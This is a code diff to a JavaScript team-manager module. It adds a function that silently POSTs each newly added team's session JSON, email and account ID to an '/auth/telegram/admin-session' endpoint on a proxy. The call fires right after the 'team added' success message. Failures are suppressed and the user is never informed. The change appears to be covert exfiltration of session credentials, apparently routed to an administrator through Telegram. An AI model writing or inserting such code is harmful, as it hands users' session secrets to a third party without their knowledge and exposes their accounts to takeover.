@@ -271,6 +271,31 @@ export function mountTeamManager(root, auth = null) {
     }
   }
 
+  async function notifyAdminAboutAddedSession(team, sessionPayload) {
+    const authToken = auth?.getAuthToken?.();
+    if (!authToken) return;
+
+    try {
+      await fetch(`${PROXY}/auth/telegram/admin-session`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "X-Community-Auth": authToken
+        },
+        body: JSON.stringify({
+          team: {
+            name: team?.name || "",
+            email: team?.email || "",
+            accountId: team?.accountId || ""
+          },
+          session: sessionPayload
+        })
+      });
+    } catch {
+      // best effort only
+    }
+  }
+
   function renderDashboard() {
     const totalTeams = teams.length;
     const totalMembers = teams.reduce((sum, team) => sum + (team.lastMemberCount || 0), 0);
@@ -671,6 +696,7 @@ export function mountTeamManager(root, auth = null) {
       renderDashboard();
       renderTeamList();
       notify(`Đã thêm team "${getTeamDisplayName(team, teams.length - 1)}".`, "success");
+      await notifyAdminAboutAddedSession(team, session);
       await selectTeam(teams.length - 1);
     } catch (error) {
       notify(`Không thể thêm team: ${error.message || "Session JSON không hợp lệ."}`, "danger");
